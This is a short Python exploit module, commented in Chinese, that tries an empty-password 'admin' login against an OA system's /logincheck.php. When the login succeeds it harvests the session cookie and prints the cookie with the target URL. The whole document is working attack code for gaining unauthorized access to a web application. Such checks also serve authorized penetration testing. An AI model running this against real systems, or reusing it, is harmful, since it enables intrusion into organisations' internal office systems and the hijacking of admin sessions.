import requests
def unauth(host): # 常规空登录以及获取Cookie(全版本)
    content = ''
    content += '正在尝试空口令登录' + '\n'
    url = host + '/logincheck.php'
    try:
        data = {'UNAME':'admin','PASSWORD':'','encode_type':'1'}
        response = requests.post(url=url,data=data,timeout=2)
        cookie_key = response.cookies.keys()
        cookie_value = response.cookies.values()
        get_cookie = ''
        for i in range(0,len(cookie_key)):
            get_cookie += cookie_key[i] + '=' + cookie_value[i] + ';' # 获取cookie并拼接成cookie格式
        # print(get_cookie)
        if '正在进入OA系统' in response.text:
            content += '空口令登录成功！' + '\n'
            content += 'URL地址为:' + host + '\n'
            content += 'Cookie为:' + get_cookie + '\r\n'
            print(content)
            return content
        else:
            content +=  '不存在空口令' + '\r\n'
            print(content)
            return content
    except:
        print("目标不存在空口令漏洞或者不能访问\n")

def run(host):
    unauth(host)
